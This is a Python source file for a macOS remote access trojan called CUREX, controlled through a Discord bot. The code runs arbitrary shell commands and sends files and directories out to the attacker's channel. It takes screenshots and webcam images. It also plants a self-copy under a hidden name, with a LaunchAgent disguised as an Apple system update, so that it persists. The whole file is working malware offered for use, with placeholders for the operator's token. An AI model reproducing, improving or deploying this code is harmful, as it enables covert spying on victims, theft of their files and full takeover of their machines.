##### CUREX V0.1 #####

##### This is a semi basic python rat                                   #####
##### that makes use of discord bot tokens and channel ids              #####
##### change these place holders too yours and invite your bot to your  #####
##### server and use it from there                                      #####


import discord
import asyncio
import os
import subprocess
import platform
import socket
import time
import requests
import sys
import zipfile
import io
from discord.ext import commands
from PIL import ImageGrab

# Configuration
DISCORD_BOT_TOKEN = "YourTokenHere"
CHANNEL_ID = YOURCHANNELID  # Replace with your channel ID
COMMAND_PREFIX = "!"

# Global variables
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=discord.Intents.all())
current_directory = os.getcwd()

def is_macOS():
    return platform.system() == 'Darwin'

if not is_macOS():
    print("This script is designed for macOS only.")
    sys.exit(1)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    channel = bot.get_channel(CHANNEL_ID)
    await channel.send(f"`✅ macOS agent connected from {socket.gethostname()}`")

@bot.command(name='shell')
async def shell_command(ctx, *, command):
    """Execute shell commands"""
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        
        output = stdout if stdout else stderr
        if not output:
            output = "Command executed successfully with no output."
            
        # Split long output into multiple messages
        if len(output) > 1900:
            for i in range(0, len(output), 1900):
                await ctx.send(f"```\n{output[i:i+1900]}\n```")
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"Error executing command: ```{str(e)}```")

@bot.command(name='cd')
async def change_directory(ctx, directory):
    """Change current working directory"""
    global current_directory
    try:
        os.chdir(directory)
        current_directory = os.getcwd()
        await ctx.send(f"Current directory changed to: `{current_directory}`")
    except Exception as e:
        await ctx.send(f"Error changing directory: ```{str(e)}```")

@bot.command(name='pwd')
async def print_working_directory(ctx):
    """Print current working directory"""
    await ctx.send(f"Current directory: `{current_directory}`")

@bot.command(name='ls')
async def list_directory(ctx, directory="."):
    """List directory contents"""
    try:
        if directory == ".":
            directory = current_directory
        
        contents = os.listdir(directory)
        output = "\n".join(contents)
        if len(output) > 1900:
            for i in range(0, len(output), 1900):
                await ctx.send(f"```\n{output[i:i+1900]}\n```")
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"Error listing directory: ```{str(e)}```")

@bot.command(name='download')
async def download_file(ctx, file_path):
    """Download a file from the target system"""
    try:
        if not os.path.exists(file_path):
            await ctx.send("File does not exist.")
            return
        
        if os.path.isdir(file_path):
            # Create a zip file for directories
            zip_filename = f"{os.path.basename(file_path)}.zip"
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(file_path):
                    for file in files:
                        zipf.write(os.path.join(root, file))
            file_to_send = zip_filename
        else:
            file_to_send = file_path
        
        with open(file_to_send, 'rb') as f:
            await ctx.send(file=discord.File(f))
        
        if os.path.exists(zip_filename):
            os.remove(zip_filename)
    except Exception as e:
        await ctx.send(f"Error downloading file: ```{str(e)}```")

@bot.command(name='upload')
async def upload_file(ctx):
    """Upload a file to the target system"""
    try:
        if not ctx.message.attachments:
            await ctx.send("No file attached.")
            return
        
        attachment = ctx.message.attachments[0]
        file_data = await attachment.read()
        
        file_path = os.path.join(current_directory, attachment.filename)
        with open(file_path, 'wb') as f:
            f.write(file_data)
        
        await ctx.send(f"File uploaded successfully to: `{file_path}`")
    except Exception as e:
        await ctx.send(f"Error uploading file: ```{str(e)}```")

@bot.command(name='screenshot')
async def take_screenshot(ctx):
    """Take a screenshot of the target's display"""
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(current_directory, "screenshot.png")
        screenshot.save(screenshot_path)
        
        with open(screenshot_path, 'rb') as f:
            await ctx.send(file=discord.File(f))
        
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"Error taking screenshot: ```{str(e)}```")

@bot.command(name='webcam')
async def capture_webcam(ctx):
    """Capture an image from the webcam"""
    try:
        webcam_path = os.path.join(current_directory, "webcam.jpg")
        
        # Try different webcam capture utilities
        if os.path.exists("/usr/local/bin/imagesnap"):
            subprocess.run(["/usr/local/bin/imagesnap", webcam_path], check=True)
        elif os.path.exists("/usr/local/bin/fswebcam"):
            subprocess.run(["/usr/local/bin/fswebcam", "-r", "1280x720", "--no-banner", webcam_path], check=True)
        else:
            await ctx.send("No webcam capture utility found (install imagesnap or fswebcam)")
            return
        
        with open(webcam_path, 'rb') as f:
            await ctx.send(file=discord.File(f))
        
        os.remove(webcam_path)
    except Exception as e:
        await ctx.send(f"Error capturing webcam: ```{str(e)}```")

@bot.command(name='persist')
async def persist(ctx):
    """Attempt to maintain persistence on the target system"""
    try:
        # Create a launch agent for persistence
        user_home = os.path.expanduser("~")
        agent_name = "com.apple.systemupdate"
        plist_path = f"{user_home}/Library/LaunchAgents/{agent_name}.plist"
        script_path = f"{user_home}/.systemupdate.py"
        
        # Copy the current script to a hidden location
        with open(__file__, 'r') as f:
            script_content = f.read()
        
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        # Create the launch agent plist
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{agent_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
        
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        
        # Load the launch agent
        subprocess.run(["launchctl", "load", plist_path], check=True)
        
        await ctx.send("Persistence established successfully.")
    except Exception as e:
        await ctx.send(f"Error establishing persistence: ```{str(e)}```")

@bot.command(name='exit')
async def exit_bot(ctx):
    """Terminate the connection"""
    await ctx.send("`🛑 Disconnecting agent...`")
    await bot.close()

def run_bot():
    while True:
        try:
            bot.run(DISCORD_BOT_TOKEN)
        except Exception as e:
            print(f"Error: {e}. Reconnecting in 30 seconds...")
            time.sleep(30)

if __name__ == "__main__":
    run_bot()
